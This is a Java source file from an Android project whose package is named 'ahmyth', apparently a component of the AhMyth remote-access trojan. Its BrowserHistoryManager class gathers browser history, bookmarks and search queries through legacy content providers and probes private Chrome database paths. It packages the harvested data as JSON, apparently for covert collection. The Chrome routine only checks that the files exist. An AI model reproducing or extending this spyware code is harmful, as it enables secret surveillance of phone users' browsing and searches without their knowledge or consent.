package ahmyth.mine.king.ahmyth;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

/**
 * BrowserHistoryManager retrieves browser history and bookmarks
 * Note: Modern browsers don't expose history via ContentProviders anymore
 * This provides limited functionality based on available APIs
 */
public class BrowserHistoryManager {
    private static final String TAG = "BrowserHistory";
    
    private Context context;
    
    // Browser bookmark columns (for older Android versions)
    private static final String COLUMN_TITLE = "title";
    private static final String COLUMN_URL = "url";
    private static final String COLUMN_DATE = "date";
    private static final String COLUMN_VISITS = "visits";
    private static final String COLUMN_BOOKMARK = "bookmark";
    private static final String COLUMN_CREATED = "created";
    
    // Browser URI
    private static final Uri BROWSER_URI = Uri.parse("content://browser/bookmarks");
    
    public BrowserHistoryManager(Context context) {
        this.context = context;
    }
    
    /**
     * Get browser history from default browser
     */
    public JSONObject getBrowserHistory() {
        JSONObject result = new JSONObject();
        JSONArray historyArray = new JSONArray();
        
        try {
            // Try to get history from legacy browser content provider
            try {
                ContentResolver contentResolver = context.getContentResolver();
                
                String[] projection = new String[] {
                    COLUMN_TITLE,
                    COLUMN_URL,
                    COLUMN_DATE,
                    COLUMN_VISITS
                };
                
                Cursor cursor = contentResolver.query(
                    BROWSER_URI,
                    projection,
                    COLUMN_BOOKMARK + " = 0",
                    null,
                    COLUMN_DATE + " DESC"
                );
                
                if (cursor != null) {
                    int titleIdx = cursor.getColumnIndex(COLUMN_TITLE);
                    int urlIdx = cursor.getColumnIndex(COLUMN_URL);
                    int dateIdx = cursor.getColumnIndex(COLUMN_DATE);
                    int visitsIdx = cursor.getColumnIndex(COLUMN_VISITS);
                    
                    while (cursor.moveToNext()) {
                        JSONObject entry = new JSONObject();
                        if (titleIdx >= 0) entry.put("title", cursor.getString(titleIdx));
                        if (urlIdx >= 0) entry.put("url", cursor.getString(urlIdx));
                        if (dateIdx >= 0) entry.put("date", cursor.getLong(dateIdx));
                        if (visitsIdx >= 0) entry.put("visits", cursor.getInt(visitsIdx));
                        entry.put("source", "default_browser");
                        historyArray.put(entry);
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.d(TAG, "Default browser history not accessible: " + e.getMessage());
            }
            
            // Try Chrome history (requires root)
            JSONArray chromeHistory = getChromeHistory();
            for (int i = 0; i < chromeHistory.length(); i++) {
                historyArray.put(chromeHistory.getJSONObject(i));
            }
            
            result.put("count", historyArray.length());
            result.put("history", historyArray);
            result.put("success", true);
            result.put("note", "Modern browsers don't expose history to other apps");
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating history JSON", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ignored) {}
        }
        
        return result;
    }
    
    /**
     * Get browser bookmarks
     */
    public JSONObject getBookmarks() {
        JSONObject result = new JSONObject();
        JSONArray bookmarksArray = new JSONArray();
        
        try {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                
                String[] projection = new String[] {
                    COLUMN_TITLE,
                    COLUMN_URL,
                    COLUMN_DATE,
                    COLUMN_CREATED
                };
                
                Cursor cursor = contentResolver.query(
                    BROWSER_URI,
                    projection,
                    COLUMN_BOOKMARK + " = 1",
                    null,
                    COLUMN_DATE + " DESC"
                );
                
                if (cursor != null) {
                    int titleIdx = cursor.getColumnIndex(COLUMN_TITLE);
                    int urlIdx = cursor.getColumnIndex(COLUMN_URL);
                    int dateIdx = cursor.getColumnIndex(COLUMN_DATE);
                    int createdIdx = cursor.getColumnIndex(COLUMN_CREATED);
                    
                    while (cursor.moveToNext()) {
                        JSONObject entry = new JSONObject();
                        if (titleIdx >= 0) entry.put("title", cursor.getString(titleIdx));
                        if (urlIdx >= 0) entry.put("url", cursor.getString(urlIdx));
                        if (dateIdx >= 0) entry.put("lastVisit", cursor.getLong(dateIdx));
                        if (createdIdx >= 0) entry.put("created", cursor.getLong(createdIdx));
                        bookmarksArray.put(entry);
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.d(TAG, "Bookmarks not accessible: " + e.getMessage());
            }
            
            result.put("count", bookmarksArray.length());
            result.put("bookmarks", bookmarksArray);
            result.put("success", true);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating bookmarks JSON", e);
        }
        
        return result;
    }
    
    /**
     * Try to get Chrome history (requires special access)
     */
    private JSONArray getChromeHistory() {
        JSONArray historyArray = new JSONArray();
        
        // Chrome history database path
        String[] possiblePaths = {
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.chrome.beta/app_chrome/Default/History",
            "/data/data/com.chrome.dev/app_chrome/Default/History",
            "/data/data/com.chrome.canary/app_chrome/Default/History"
        };
        
        for (String path : possiblePaths) {
            File historyFile = new File(path);
            if (historyFile.exists() && historyFile.canRead()) {
                Log.d(TAG, "Found Chrome history at: " + path);
                // Would need SQLite access to read the database
                // This is limited without root
            }
        }
        
        return historyArray;
    }
    
    /**
     * Get search queries from browser
     */
    public JSONObject getSearchQueries() {
        JSONObject result = new JSONObject();
        JSONArray queriesArray = new JSONArray();
        
        try {
            ContentResolver contentResolver = context.getContentResolver();
            
            try {
                Uri searchUri = Uri.parse("content://browser/searches");
                Cursor cursor = contentResolver.query(
                    searchUri,
                    null,
                    null,
                    null,
                    "date DESC"
                );
                
                if (cursor != null) {
                    int searchIndex = cursor.getColumnIndex("search");
                    int dateIndex = cursor.getColumnIndex("date");
                    
                    while (cursor.moveToNext()) {
                        JSONObject entry = new JSONObject();
                        if (searchIndex >= 0) {
                            entry.put("query", cursor.getString(searchIndex));
                        }
                        if (dateIndex >= 0) {
                            entry.put("date", cursor.getLong(dateIndex));
                        }
                        queriesArray.put(entry);
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.d(TAG, "Search queries not accessible: " + e.getMessage());
            }
            
            result.put("count", queriesArray.length());
            result.put("queries", queriesArray);
            result.put("success", true);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating queries JSON", e);
        }
        
        return result;
    }
    
    /**
     * Get all browser data combined
     */
    public JSONObject getAllBrowserData() {
        JSONObject result = new JSONObject();
        
        try {
            result.put("history", getBrowserHistory());
            result.put("bookmarks", getBookmarks());
            result.put("searches", getSearchQueries());
            result.put("timestamp", System.currentTimeMillis());
        } catch (JSONException e) {
            Log.e(TAG, "Error combining browser data", e);
        }
        
        return result;
    }
}
